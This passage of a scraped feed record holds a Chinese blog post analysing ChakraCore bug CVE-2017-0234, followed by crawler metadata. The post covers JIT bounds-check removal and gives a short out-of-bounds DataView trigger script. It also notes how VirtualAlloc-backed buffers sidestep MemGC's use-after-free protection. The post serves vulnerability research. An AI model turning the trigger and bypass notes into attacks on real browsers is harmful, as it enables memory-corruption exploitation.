class=\"keyword\">var</span> i = begin; i &lt; end; i += step)</span><br><span class=\"line\">     view.setInt32(i,num);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> buffer = <span class=\"keyword\">new</span> <span class=\"built_in\">ArrayBuffer</span>(<span class=\"number\">0x10000</span>);</span><br><span class=\"line\"><span class=\"keyword\">var</span> view = <span class=\"keyword\">new</span> <span class=\"built_in\">DataView</span>(buffer);</span><br><span class=\"line\">write(<span class=\"number\">0</span>, <span class=\"number\">0x4000</span>, <span class=\"number\">1</span>, <span class=\"number\">0x1234</span>);</span><br><span class=\"line\">write(<span class=\"number\">0x3000000e</span>, <span class=\"number\">0x40000010</span>, <span class=\"number\">0x10000</span>, <span class=\"number\">1</span>);</span><br /></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br /></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">$ /d/chakracore/ChakraCore/Build/VcBuild/bin/x64_debug/ch.exe test3.js</span><br><span class=\"line\">TypeError: DataView operation access beyond specified buffer length</span><br><span class=\"line\">   at write (d:\\cve-2017-0234\\test3.js:3:6)</span><br><span class=\"line\">   at Global code (d:\\cve-2017-0234\\test3.js:9:1)</span><br /></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-041938.jpg\" alt=\"\"><br>全局搜索报错字符串并查找引用寻找原因。<br> <img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-042028.jpg\" alt=\"\" /></br></br></img></p>\n<h4 id=\"其他\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h4>\n<p>在patch后，要触发需要构造常数边界(上面有分析)</p>\n<figure class=\"highlight c++\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br /></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (isProfilableStElem ||</span><br><span class=\"line\">            !instr-&gt;IsDstNotAlwaysConvertedToInt32() ||</span><br><span class=\"line\">            ( (baseValueType.GetObjectType() == ObjectType::Float32VirtualArray ||</span><br><span class=\"line\">              baseValueType.GetObjectType() == ObjectType::Float64VirtualArray) &amp;&amp;</span><br><span class=\"line\">              !instr-&gt;IsDstNotAlwaysConvertedToNumber()</span><br><span class=\"line\"> )</span><br /></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>isProfilableStElem显然是JIT优化时用来采集的一个标志，所以通过循环生成JIT的时候就可以走进if body。<br>但是其他和IR有关的“||”选项显然是不能放过的线索，可以测试如何走进这些路径。</br></p>\n<h3 id=\"开发者的assumption\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#开发者的assumption\" class=\"headerlink\" title=\"开发者的assumption\"></a>开发者的assumption</h3>\n<h4 id=\"assumption\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#assumption\" class=\"headerlink\" title=\"assumption\"></a>assumption</h4>\n<p>如图可知，传入的length的最大长度为MaxArrayBufferLength，length的类型是uint32即最大值2^32-1<br>MaxArrayBufferLength 0x7fffffff const unsigned int<br>这里即是对要分配的buffer的空间大小的一次校验。<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031659.jpg\" alt=\"\"><br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031809.jpg\" alt=\"\" /></br></img></br></br></br></p>\n<p>而采用VirtualAlloc一次分配的大小是4GB即2^32<br><code>#define MAX_ASMJS_ARRAYBUFFER_LENGTH 0x100000000 //4GB</code><br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031827.jpg\" alt=\"\"><br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031841.jpg\" alt=\"\"><br>然而在通过索引访问buffer的时候，索引的类型也是uint32的。<br>于是若是数组索引，按照单个元素size同比扩容之后，则有可能超过4GB的虚拟内存（即length最大可以申请到4G，但是访问可以是4G*x）。<br>而对于访问超过分配的buffer但是在VirtualAlloc分配的4G内的越界读写会直接会由硬件进行捕获。<br>我推测开发者在写代码的时候，正是没有注意到这一点，于是只是简单的出于性能优化的考虑，错误的判断了索引无论如何都不可能超出保留的大空间越界访问（因为4G是“最大”了，而在4G内的越界访问都会被硬件捕获并终止）<br>于是就直接去掉了边界。 </br></br></br></br></br></img></br></img></br></br></p>\n<h4 id=\"other\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#other\" class=\"headerlink\" title=\"other\"></a>other</h4>\n<p>最简单也是最常见的可优化边界检查代码就是处在循环里的边界检查。</p>\n<p>我们假设循环具有迭代变量i，且初值为init, 终值为fin，i++<br>只有循环控制代码修改i<br>假设必须要满足的范围是<code>lo &lt; i &lt; hi</code><br>本来循环应该是这样的：</br></br></br></p>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br /></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">    i &lt;- init</span><br><span class=\"line\">L1: ...</span><br><span class=\"line\">    if i &lt; lo trap</span><br><span class=\"line\">    if i &gt; hi trap</span><br><span class=\"line\">    use of i that must satisfy lo &lt;= i &lt;=hi</span><br><span class=\"line\"> ....</span><br><span class=\"line\"> i &lt;- i + 1</span><br><span class=\"line\"> if i &lt;= fin goto L1</span><br /></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<p>最容易处理的情况是i为常量v，则只需要将检查lo &lt; i &lt; hi的代码外提到循环的前置块里即可</p>\n<p>下一种稍微复杂一点的情况是i为变量，这样我们就要处理范围表达式lo &lt; i &lt; hi（比如说分配的数组最大空间不超过hi，最小不小于0）<br>其中i是循环控制变量，在这种情况下，只需要lo &lt; init且 fin &lt; hi ， 就能满足范围表达式<br>于是我们可以这么做</br></br></p>\n<figure class=\"highlight plain\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br /></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\">    if lo &gt; init trap (i的初始值为init，如果init 比 i需满足的最小值还小，则trap</span><br><span class=\"line\">    t1 &lt;- min(fin, hi)</span><br><span class=\"line\">    i &lt;- init</span><br><span class=\"line\">L1: ...</span><br><span class=\"line\">    use of i that must satisfy lo &lt;= i &lt;= hi</span><br><span class=\"line\"> ....</span><br><span class=\"line\"> i &lt;- i + 1</span><br><span class=\"line\"> if i &lt;= t1 goto L1</span><br><span class=\"line\"> if i &lt;= fin trap 6(i本应该到达fin，如果i不能到达它本来应该到达的值，就trap</span><br /></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure>\n<h3 id=\"GC和VirtualAlloc在安全性上的区别\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#GC和VirtualAlloc在安全性上的区别\" class=\"headerlink\" title=\"GC和VirtualAlloc在安全性上的区别\"></a>GC和VirtualAlloc在安全性上的区别</h3>\n<h4 id=\"UAF\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#UAF\" class=\"headerlink\" title=\"UAF\"></a>UAF</h4>\n<p>UAF(Use After Free)：即释放后使用。将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控</p>\n<h4 id=\"MemGC\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#MemGC\" class=\"headerlink\" title=\"MemGC\"></a>MemGC</h4>\n<p><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100435.jpg\" alt=\"\"><br>如图，对象A申请了一个数据块，当释放这个数据块时，若还有其他对象引用这个数据块，那么MemGC不会回收利用，其他程序无法将数据写入这个数据块，从而阻止了UAF漏洞的利用；若没有其他对象引用这个数据块，就不存在UAF漏洞了。</br></img></p>\n<h4 id=\"标记清除法\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#标记清除法\" class=\"headerlink\" title=\"标记清除法\"></a>标记清除法</h4>\n<p>标记清除（Mark and Sweep）是最早开发出的GC算法（1960年）。它的原理非常简单，首先从根开始将可能被引用的对象用递归的方式进行标记，然后将没有标记到的对象作为垃圾进行回收。<br><img src=\"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100040.jpg\" alt=\"\"><br>图显示了标记清除算法的大致原理。<br>图中（1）部分显示了随着程序的运行而分配出一些对象的状态，一个对象可以对其他的对象进行引用。<br>图中（2）部分中，GC开始执行，<strong>从根开始对可能被引用的对象打上标记</strong>，大多数情况下，这种标记是通过对象内部的标志（Flag）来实现的。于是，被标记的对象我们把它们涂黑。<br>图中（3）部分中，被标记的对象所能够引用的对象也被打上标记。重复这一步骤的话，就可以将从根开始可能被间接引用到的对象全部打上标记。到此为止的操作，称为标记阶段（Mark phase）。<br>标记阶段完成时，被标记的对象就被视为“存活”对象。<br>图中（4）部分中，将全部对象按顺序扫描一遍，将没有被标记的对象进行回收。这一操作被称为清除阶段（Sweep phase）。<br>在扫描的同时，还需要将存活对象的标记清除掉，以便为下一次GC操作做好准备。标记清除算法的处理时间，是和存活对象数与对象总数的总和相关的。</br></br></br></br></br></br></br></img></br></p>\n<h4 id=\"GC和VirtualAlloc在安全性上的区别-1\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#GC和VirtualAlloc在安全性上的区别-1\" class=\"headerlink\" title=\"GC和VirtualAlloc在安全性上的区别\"></a>GC和VirtualAlloc在安全性上的区别</h4>\n<p>VirtualAlloc是裸的内存分配释放，并没有对UAF加以缓解。<br>而通过控制ArrayBuffer的length(&gt;0x10000)，我们可以选择通过VirtualAlloc来分配内存，于是就“绕开”了GC的保护，就有可能通过UAF来完成利用。</br></p>\n<h3 id=\"总结\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3>\n<p>通过分析Root Cause，并进一步通过对Assumption的思考，对patch的分析，相关知识由点及面的学习，并最后在脆弱性上进行考虑，找出可行的利用点，思考的深度有所提升。</p>\n<h3 id=\"Other\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h3>\n<h4 id=\"Windbg常用命令\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#Windbg常用命令\" class=\"headerlink\" title=\"Windbg常用命令\"></a>Windbg常用命令</h4>\n<ul>\n <li>dd memory<br>打印内存</br></li>\n <li>u<br>打印汇编</br></li>\n <li>k<br>查看堆栈<h4 id=\"一些trick\"><a href=\"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/#一些trick\" class=\"headerlink\" title=\"一些trick\"></a>一些trick</h4></br></li>\n</ul>\n<ol>\n <li>寻找JIT代码，定位CallLoopBody，它的参数就是JIT代码地址。</li>\n <li>寻找生成JIT代码的地方可以考虑在Func::Codegen那里下断。</li>\n</ol>","descriptionType":"html","publishedDate":"Tue, 03 Jul 2018 13:32:43 +0000","feedId":26778,"bgimg":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg","linkMd5":"41143e5a48060242b065786c4a07f857","destWidth":830,"destHeight":292,"sourceBytes":48442,"destBytes":18694,"author":"","articleImgCdnMap":{"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg":null,"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070434.jpg":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn49@2020_4/2021/05/27/16-13-19-527_0ea95ed3ff2d353e.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070449.jpg":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn30@2020_6/2021/05/27/16-13-18-761_1921dae9394e3ce8.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070458.jpg":null,"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070506.jpg":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn34@2020_2/2021/05/27/16-13-17-651_a54783d2e39e4857.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070515.jpg":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn88@2020_5/2021/05/27/16-13-18-837_d588ee3942dbd123.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070526.jpg":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn97@2020_4/2021/05/27/16-13-17-458_391cd589fda9f907.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070550.jpg":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn4@2020_6/2021/05/27/16-13-17-760_08315df8d8c5051f.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070621.jpg":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn16@2020_5/2021/05/27/16-13-19-587_3a8013ea72e27928.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070909.jpg":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn28@2020_5/2021/05/27/16-13-20-924_e92c621ef2ef6593.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070946.jpg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn8@2020_4/2021/05/27/16-13-21-023_d8fb50260deaeda1.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-072024.jpg":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn74@2020_4/2021/05/27/16-13-19-258_86f606b7d42b432a.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071023.jpg":null,"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071054.jpg":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn67@2020_5/2021/05/27/16-13-19-947_cea19465483f0731.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071206.jpg":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn99@2020_6/2021/05/27/16-13-18-594_d612bfe0fa47a642.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071218.jpg":null,"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071241.jpg":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn48@2020_5/2021/05/27/16-13-18-408_6a5397ddf7edb8bc.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071601.jpg":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_6/2021/05/27/16-13-18-255_dffe3b115ae9b973.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071716.jpg":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn63@2020_4/2021/05/27/16-13-19-603_f1b7a03eb0a3981c.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071642.jpg":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn44@2020_5/2021/05/27/16-13-19-203_33f73767300cb4d8.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-031720.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn3@2020_5/2021/05/27/16-13-19-622_02132d505a1d1560.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032016.jpg":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn91@2020_4/2021/05/27/16-13-21-587_47eaf3e1f230c087.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032100.jpg":null,"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032346.jpg":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn11@2020_6/2021/05/27/16-13-18-761_fd4b7d7e0c549ad7.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032430.jpg":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn83@2020_1/2021/05/27/16-13-17-699_dcebea1bb34c2008.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-032701.jpg":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn94@2020_6/2021/05/27/16-13-20-215_829933f37f0ee8d7.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-041938.jpg":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn70@2020_6/2021/05/27/16-13-20-406_14988903bdd61441.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-08-042028.jpg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn97@2020_2/2021/05/27/16-13-22-594_8a53a7a617fa01a9.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031659.jpg":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn18@2020_3/2021/05/27/16-13-18-166_9229abaee7a4034a.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031809.jpg":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn85@2020_1/2021/05/27/16-13-21-021_397e175fe1beae47.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031827.jpg":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn23@2020_6/2021/05/27/16-13-18-072_0919c8d4b4644a1e.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-17-031841.jpg":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn52@2020_6/2021/05/27/16-13-24-187_1a70c1b396fb00b1.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100435.jpg":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn59@2020_1/2021/05/27/16-13-19-209_fce89819a263d9d0.webp","https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-24-100040.jpg":"https://cdn.jsdelivr.net/gh/myreaderx/cdn7@2020_1/2021/05/27/16-13-20-185_2a7430441f63f580.webp"},"publishedOrCreatedDate":1622131991045}],"record":{"createdTime":"2021-05-28 00:13:11","updatedTime":"2021-05-28 00:13:11","feedId":26778,"fetchDate":"Thu, 27 May 2021 16:13:11 +0000","fetchMs":288,"handleMs":75,"totalMs":68564,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"245d88d7b2d8f26704713c23b090d029","hostName":"us-038*","requestId":"0fe36cb721104d448762655a9c6de313_26778","contentType":"application/xml","totalBytes":1492150,"bgimgsTotal":1,"bgimgsGithubTotal":0,"articlesImgsTotal":34,"articlesImgsGithubTotal":29,"successGithubMap":{"myreaderx8":1,"myreaderx7":1,"myreaderx15":1,"myreaderx16":1,"myreaderx6":1,"myreaderx10":1,"myreaderx32":2,"myreaderx4":1,"myreaderx3":1,"myreaderx11":1,"myreaderx33":1,"myreaderx12":1,"myreaderx2":2,"myreaderx1":1,"myreaderx13":1,"myreaderx30":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx22":2,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":2,"myreaderx23":2,"myreaderx31":1}},"feed":{"createdTime":"2020-09-07 02:39:30","updatedTime":"2020-09-07 04:39:57","id":26778,"name":"Sakuraのblog","url":"http://eternalsakura13.com/atom.xml","subscriber":122,"website":null,"icon":"http://eternalsakura13.com/images/apple-touch-icon-next.png?v=5.1.4","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx65/cdn77@2020_2/2020/09/06/20-39-44-954_37c348618650628a.png","description":"","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2021-05-28 00:14:19","updatedTime":"2021-05-28 00:14:19","id":null,"feedId":26778,"linkMd5":"41143e5a48060242b065786c4a07f857"}],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":1492150,"tmpBgImgCdnBytes":0,"extra4":{"start":1622131990662,"total":0,"statList":[{"spend":308,"msg":"获取xml内容"},{"spend":75,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":63736,"msg":"正文链接上传到cdn"}]},"extra5":34,"extra6":34,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg","sourceStatusCode":200,"destWidth":830,"destHeight":292,"sourceBytes":48442,"destBytes":18694,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":2485,"convertSpendMs":9,"createdTime":"2021-05-28 00:13:11","host":"europe-56*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857,41143e5a48060242b065786c4a07f857","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn77/contents/2021/05/27/16-13-13-488_2daa4fe141d6c8e9.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Thu, 27 May 2021 16:13:13 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["E850:3CF9:CA53B:CF9FD:60AFC519"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1622132918"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["62"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn77/contents/2021/05/27/16-13-13-488_2daa4fe141d6c8e9.webp","historyStatusCode":[],"spendMs":154},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.3 KB","destSize":"18.3 KB","compressRate":"38.6%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070412.jpg","sourceStatusCode":200,"destWidth":830,"destHeight":292,"sourceBytes":48442,"destBytes":18694,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":1741,"convertSpendMs":9,"createdTime":"2021-05-28 00:13:13","host":"europe-56*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857,41143e5a48060242b065786c4a07f857","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx23/cdn77/contents/2021/05/27/16-13-15-245_2daa4fe141d6c8e9.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 69189253.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Thu, 27 May 2021 16:13:15 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["E850:3CF9:CA6D6:CFB99:60AFC51B"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1622132918"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["62"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx23/cdn77/contents/2021/05/27/16-13-15-245_2daa4fe141d6c8e9.webp","historyStatusCode":[],"spendMs":209},"base64UserPassword":null,"token":"df0b9******************************93a6e"},"githubUser":"myreaderx23","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"47.3 KB","destSize":"18.3 KB","compressRate":"38.6%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-070458.jpg","sourceStatusCode":200,"destWidth":830,"destHeight":512,"sourceBytes":72625,"destBytes":22358,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":2561,"convertSpendMs":13,"createdTime":"2021-05-28 00:13:15","host":"us-033*","referer":"http://eternalsakura13.com/2018/07/03/cve-2017-0234-3.0/","linkMd5ListStr":"41143e5a48060242b065786c4a07f857","rawMap":{"githubUrl":"https://api.github.com/repos/myreaderx14/cdn96/contents/2021/05/27/16-13-18-038_d8d751ff4087616f.webp","resp":{"code":403,"msg":"Forbidden","body":"{\n  \"message\": \"API rate limit exceeded for user ID 68584859.\",\n  \"documentation_url\": \"https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting\"\n}\n","headerMap":{"access-control-allow-origin":["*"],"access-control-expose-headers":["ETag, Link, Location, Retry-After, X-GitHub-OTP, X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Used, X-RateLimit-Resource, X-RateLimit-Reset, X-OAuth-Scopes, X-Accepted-OAuth-Scopes, X-Poll-Interval, X-GitHub-Media-Type, Deprecation, Sunset"],"content-security-policy":["default-src 'none'"],"content-type":["application/json; charset=utf-8"],"date":["Thu, 27 May 2021 16:13:18 GMT"],"referrer-policy":["origin-when-cross-origin, strict-origin-when-cross-origin"],"server":["GitHub.com"],"strict-transport-security":["max-age=31536000; includeSubdomains; preload"],"transfer-encoding":["chunked"],"vary":["Accept-Encoding, Accept, X-Requested-With"],"x-accepted-oauth-scopes":["repo"],"x-content-type-options":["nosniff"],"x-frame-options":["deny"],"x-github-media-type":["github.v3; format=json"],"x-github-request-id":["8092:60D8:53F44:BC222:60AFC51E"],"x-oauth-scopes":["admin:enterprise, admin:gpg_key, admin:org, admin:org_hook, admin:public_key, admin:repo_hook, delete:packages, delete_repo, gist, notifications, repo, user, workflow, write:discussion, write:packages"],"x-ratelimit-limit":["60"],"x-ratelimit-remaining":["0"],"x-ratelimit-reset":["1622132921"],"x-ratelimit-resource":["core"],"x-ratelimit-used":["61"],"x-xss-protection":["0"]},"exceptionMsg":"Unexpected code 403,url is : https://api.github.com/repos/myreaderx14/cdn96/contents/2021/05/27/16-13-18-038_d8d751ff4087616f.webp","historyStatusCode":[],"spendMs":30},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"70.9 KB","destSize":"21.8 KB","compressRate":"30.8%"},{"code":1,"isDone":false,"source":"https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-04-071023.jpg","sourceStatusCode":200,"destWidth":1448,"destHeight":464,"sourceBytes":105828,"destBytes":38710,"targetWebpQuality":75,"feedId":26778,"totalSpendMs":3200,"convertSpendMs":19,"createdTime":"2021-05-28 